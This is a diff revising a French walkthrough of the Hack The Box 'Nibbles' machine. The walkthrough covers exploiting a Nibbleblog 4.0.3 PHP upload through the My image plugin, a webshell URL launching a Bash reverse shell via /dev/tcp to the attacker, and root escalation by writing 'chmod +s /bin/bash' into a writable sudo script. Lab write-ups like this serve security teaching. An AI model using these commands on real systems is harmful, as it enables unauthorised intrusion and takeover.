@@ -14,8 +14,8 @@ draft: true
 # --- PaperMod / navigation ---
 type: "writeups"
 summary: "Nibbles (HTB Easy) : exploitation de Nibbleblog via le plugin My image, obtention d’un shell nibbler puis escalade de privilèges avec un script autorisé en sudo."
-description: "Writeup Nibbles Hack The Box en français : Nibbleblog 4.0.3, upload PHP via le plugin My image, shell nibbler puis escalade de privilèges avec sudo monitor.sh."
-tags: ["Hack The Box","HTB Easy","linux-privesc","nibbleblog","file-upload","php","sudo"]
+description: "Writeup Nibbles HTB Easy en français : Nibbleblog 4.0.3, upload PHP via My image, shell nibbler puis escalade de privilèges via sudo."
+tags: ["Hack The Box","HTB Easy","linux-privesc","nibbleblog","file-upload","php-upload","sudo"]
 categories: ["Mes writeups"]
 
 # Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
@@ -135,7 +135,7 @@ La machine **Nibbles** de Hack The Box, classée **HTB Easy**, propose un chemin
 
 La première partie du challenge repose sur un site web minimal qui mène vers une installation de **Nibbleblog**. L’analyse de l’application permet ensuite d’identifier une version ancienne du CMS, puis de tester concrètement une faiblesse liée au plugin **My image**. L’exploitation de cet upload permet d’obtenir un premier shell avec l’utilisateur `nibbler`.
 
-La seconde partie se concentre sur l’environnement local de cet utilisateur. L’examen des droits `sudo` révèle qu’un script précis peut être exécuté avec les privilèges `root`. En retrouvant ce script dans l’archive `personal.zip`, il devient possible de comprendre le chemin d’escalade et de passer d’un accès utilisateur à un accès administrateur.
+La seconde partie se concentre sur l’environnement local de cet utilisateur. L’examen des droits `sudo` révèle qu’un script précis peut être exécuté avec les privilèges `root`. L’analyse des fichiers présents dans le répertoire personnel permet ensuite de relier cette autorisation à un chemin d’escalade exploitable.
 
 Ce writeup détaille donc la progression complète sur **Nibbles** : énumération des services, découverte de Nibbleblog, prise de pied via upload PHP, stabilisation du shell, puis escalade de privilèges à partir d’un script autorisé en sudo.
 
@@ -161,9 +161,9 @@ PORT   STATE SERVICE
 # Nmap done at [date] -- 1 IP address (1 host up) scanned in 6.86 seconds
 ```
 
-### Scan FTP/SMB (si services détectés)
+### Scan FTP/SMB 
 
-Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :
+Après le scan initial, le script vérifie la présence éventuelle de services **FTP** ou **SMB** afin de lancer une énumération ciblée si nécessaire :
 
 - **FTP** sur le port **21**
 - **SMB** sur le port **139** et/ou **445**
@@ -476,10 +476,17 @@ Tu arrives sur une instance **Nibbleblog**, un moteur de blog léger écrit en P
 mon-recoweb http://nibbles.htb/nibbleblog/ 
 ```
 
-Les résultats agrégés font ressortir plusieurs chemins intéressants :
+Les résultats agrégés font ressortir notamment les chemins suivants :
 
 ```txt
-http://nibbles.htb/nibbleblog/admin/ http://nibbles.htb/nibbleblog/admin.php (CODE:200|SIZE:1401) http://nibbles.htb/nibbleblog/content/ http://nibbles.htb/nibbleblog/index.php (CODE:200|SIZE:2987) http://nibbles.htb/nibbleblog/languages/ http://nibbles.htb/nibbleblog/plugins/ http://nibbles.htb/nibbleblog/README (CODE:200|SIZE:4628) http://nibbles.htb/nibbleblog/themes/ 
+http://nibbles.htb/nibbleblog/admin/
+http://nibbles.htb/nibbleblog/admin.php (CODE:200|SIZE:1401)
+http://nibbles.htb/nibbleblog/content/
+http://nibbles.htb/nibbleblog/index.php (CODE:200|SIZE:2987)
+http://nibbles.htb/nibbleblog/languages/
+http://nibbles.htb/nibbleblog/plugins/
+http://nibbles.htb/nibbleblog/README (CODE:200|SIZE:4628)
+http://nibbles.htb/nibbleblog/themes/
 ```
 
 Deux éléments sont particulièrement utiles pour la suite :
@@ -522,9 +529,7 @@ La page affiche un formulaire de connexion à l’administration de **Nibbleblog
 
 ![Page de connexion à l’administration Nibbleblog](admin-php.png)
 
-À ce stade, tu ne disposes pas encore d’identifiants.  
-
-Tu testes donc quelques combinaisons simples et cohérentes avec le contexte de la machine, par exemple :
+À ce stade, tu ne disposes pas encore d’identifiants. Dans le contexte d’une machine CTF, tu peux commencer par tester quelques combinaisons simples basées sur le nom de l’application, le nom de la machine et des identifiants administrateur courants :
 
 ```text
 admin:admin
@@ -546,9 +551,9 @@ L’accès à cette interface est une étape importante : elle te donne accès a
 
 ### Recherche d’une vulnérabilité connue
 
-La version de Nibbleblog étant maintenant identifiée, tu peux rechercher si cette version est associée à une vulnérabilité connue.
+La version de Nibbleblog étant maintenant identifiée, tu peux vérifier si cette version est associée à une vulnérabilité publique documentée.
 
-Une recherche simple sur Google avec les mots-clés suivants permet de trouver plusieurs résultats pertinents :
+Une recherche ciblée sur la version permet de trouver plusieurs références pertinentes :
 
 ```text
 nibbleblog v4.0.3 vulnerabilities -nibbles
@@ -576,11 +581,11 @@ L’avis précise que des identifiants administrateur sont nécessaires et que l
 
 Cela correspond à la situation observée : tu as accès à l’administration de Nibbleblog et le plugin **My image** est présent.
 
-L’objectif est donc maintenant de vérifier concrètement cette vulnérabilité sur la machine, en envoyant un petit fichier PHP de test via le plugin **My image**.
+Tu vérifies maintenant concrètement la vulnérabilité décrite dans l’avis de sécurité.
 
 ### Exploitation du plugin My image
 
-Tu vérifies maintenant concrètement la vulnérabilité décrite dans l’avis de sécurité.
+Tu passes maintenant au test pratique depuis l’administration de Nibbleblog.
 
 Sur Kali, tu crées un fichier PHP minimal :
 
@@ -610,9 +615,9 @@ Tu l’ouvres afin de vérifier concrètement le comportement décrit dans l’a
 
 ![Upload d’un fichier PHP via le plugin My image de Nibbleblog](MyImage.png)
 
-Comme indiqué dans l’avis de sécurité, les warnings éventuels pendant l’upload peuvent être ignorés.
+Comme indiqué dans l’avis de sécurité, l’upload peut afficher des warnings même si le fichier est bien écrit sur le serveur. Tu vérifies donc directement l’emplacement utilisé par le plugin.
 
-Le fichier est ensuite accessible à l’emplacement par défaut du plugin :
+Le fichier uploadé est accessible à l’emplacement par défaut de **My image** :
 
 ```url
 http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php
@@ -650,10 +655,13 @@ Ensuite, depuis le webshell PHP, tu exécutes une commande de reverse shell Bash
 http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.x.x/4444+0>%261'
 ```
 
-Les caractères spéciaux sont encodés pour que la commande passe correctement dans l’URL :
-
-- `%26` correspond au caractère `&` ;
-- les `+` remplacent les espaces dans la requête.
+> **Note — encodage de l’URL**
+>
+> Dans cette URL, certains caractères sont encodés afin que la commande Bash soit transmise correctement au paramètre `cmd`.
+>
+> - `%26` correspond au caractère `&` ;
+> - les `+` remplacent les espaces ;
+> - cet encodage évite que le navigateur ou le serveur web n’interprète une partie de la commande comme de simples séparateurs d’URL.
 
 Sur le listener Kali, tu reçois une connexion :
 
@@ -682,17 +690,13 @@ Le shell initial est obtenu. Il reste maintenant à le stabiliser pour travaille
 
 ### Stabilisation du shell
 
-Le shell obtenu est fonctionnel, mais il reste limité : il n’a pas de vrai terminal interactif et affiche notamment le message suivant :
+Le shell obtenu fonctionne, mais il reste limité : pas de vrai terminal interactif, pas de gestion correcte des raccourcis, et le message suivant apparaît :
 
 ```bash
 bash: no job control in this shell
 ```
 
 Pour travailler plus confortablement, tu stabilises le reverse shell avec la méthode habituelle : {{< recette "stabiliser-reverse-shell" >}}
-
-
-
-
 
 Dans le shell obtenu sur la cible, tu lances d’abord Python pour obtenir un pseudo-terminal :
 
@@ -757,7 +761,7 @@ Résultat :
 
 
 
-### Récupération du flag utilisateur
+### user.txt
 
 Une fois dans le répertoire personnel de `nibbler`, tu listes les fichiers disponibles :
 
@@ -783,9 +787,7 @@ ff92xxxxxxxxxxxxxxxxxxxxxxxxxxxffbb
 
 La prise de pied est terminée : tu disposes d’un shell stabilisé en tant qu’utilisateur `nibbler`, et le flag utilisateur a été récupéré.
 
-L’étape suivante consiste à analyser le fichier `personal.zip` et à chercher une possibilité d’escalade de privilèges depuis cette session.
-
-
+Tu peux maintenant passer à l’escalade de privilèges.
 
 ## Escalade de privilèges
 
@@ -821,7 +823,7 @@ Tu vérifies alors si ce fichier existe déjà :
 ls -l /home/nibbler/personal/stuff/monitor.sh
 ```
 
-Le fichier n’est pas présent pour le moment. Le chemin indiqué par `sudo` pointe donc vers un script attendu, mais pas  disponible dans l’arborescence actuelle.
+Le fichier n’est pas présent pour le moment. Le chemin indiqué par `sudo` pointe donc vers un script attendu, mais absent de l’arborescence actuelle.
 
 ### Recherche du script monitor.sh
 
@@ -842,7 +844,7 @@ total 8
 
 En plus du flag utilisateur, tu trouves une archive nommée `personal.zip`.
 
-Comme le nom du chemin autorisé par `sudo` commence par `/home/nibbler/personal/`, cette archive est un bon candidat pour contenir l’arborescence manquante.
+Le chemin autorisé par `sudo` commence par `/home/nibbler/personal/`. L’archive `personal.zip` devient donc un candidat naturel pour retrouver l’arborescence manquante.
 
 Tu peux d’abord lister son contenu sans l’extraire :
 
@@ -894,13 +896,13 @@ Les permissions sont particulièrement favorables :
 -rwxrwxrwx
 ```
 
-Cela signifie que le script est lisible, exécutable, mais aussi modifiable par `nibbler`.
+Le script est lisible, exécutable et modifiable par tous les utilisateurs, donc aussi par `nibbler`.
 
-À ce stade, tu as donc un script modifiable par l’utilisateur courant, et ce même script peut être exécuté en tant que `root` via `sudo`.
+À ce stade, tu as donc un fichier contrôlable par l’utilisateur courant, et ce même fichier peut être exécuté en tant que `root` via `sudo`.
 
 ### Validation de l’exécution en root
 
-Avant de modifier définitivement le script, tu peux faire un test simple pour confirmer que son contenu est bien exécuté avec les privilèges `root`.
+Avant de l’utiliser pour l’escalade, tu peux faire un test simple pour confirmer que son contenu est bien exécuté avec les privilèges `root`.
 
 Par prudence, tu conserves d’abord une copie du script original :
 
@@ -940,9 +942,13 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Ce test confirme que le contenu de `monitor.sh` est bien exécuté avec les privilèges `root`.
 
+Tu peux maintenant remplacer la commande de test par la commande finale utilisée pour l’escalade.
+
 ### Exploitation avec un Bash SUID
 
-Une fois l’exécution root confirmée, tu remplaces la commande de test par une commande permettant de poser le bit SUID sur `/bin/bash` :
+Une fois l’exécution root confirmée, tu remplaces la commande de test par une commande permettant de poser le bit SUID sur `/bin/bash`.
+
+L’idée est simple : comme la commande est exécutée avec les privilèges `root`, elle peut modifier les permissions de `/bin/bash`. Tu pourras ensuite lancer Bash avec l’option `-p` pour conserver les privilèges effectifs de `root`.
 
 ```bash
 echo 'chmod +s /bin/bash' > /home/nibbler/personal/stuff/monitor.sh
@@ -981,7 +987,7 @@ id
 Résultat attendu :
 
 ```bash
-uid=1001(nibbler) gid=1001(nibbler) euid=0(root) egid=0(root) groups=0(root),1001(nibbler)
+uid=1001(nibbler) gid=1001(nibbler) euid=0(root) egid=0(root) 
 ```
 
 L’`euid=0(root)` confirme que le shell dispose des privilèges effectifs de `root`.
@@ -995,13 +1001,11 @@ bash-4.3# cat /root/root.txt
 8229xxxxxxxxxxxxxxxxxxxxxxxxxx2621
 ```
 
-La prise de contrôle root est obtenue, ce qui termine l’escalade de privilèges et le challenge.
-
-
+Tu obtiens ainsi un accès root, ce qui termine l’escalade de privilèges et le challenge.
 
 ## Conclusion
 
-La machine **Nibbles** est un bon exemple de machine **HTB Easy** centrée sur une progression simple, mais complète : identifier une application web, exploiter une fonctionnalité vulnérable, puis analyser proprement l’environnement utilisateur pour trouver le chemin d’escalade.
+La machine **Nibbles** est un bon exemple de machine **HTB Easy** centrée sur une progression web classique : identifier une application, comprendre son fonctionnement, exploiter un upload vulnérable, puis analyser l’environnement utilisateur pour trouver le chemin d’escalade.
 
 La prise de pied repose sur **Nibbleblog** et son plugin **My image**, qui permet de déposer un fichier PHP exploitable côté serveur. Cette étape rappelle qu’un upload de fichier doit toujours être vérifié concrètement, notamment lorsque l’application affiche des messages d’erreur ou des warnings qui ne reflètent pas forcément l’état réel du fichier sur le serveur.
 
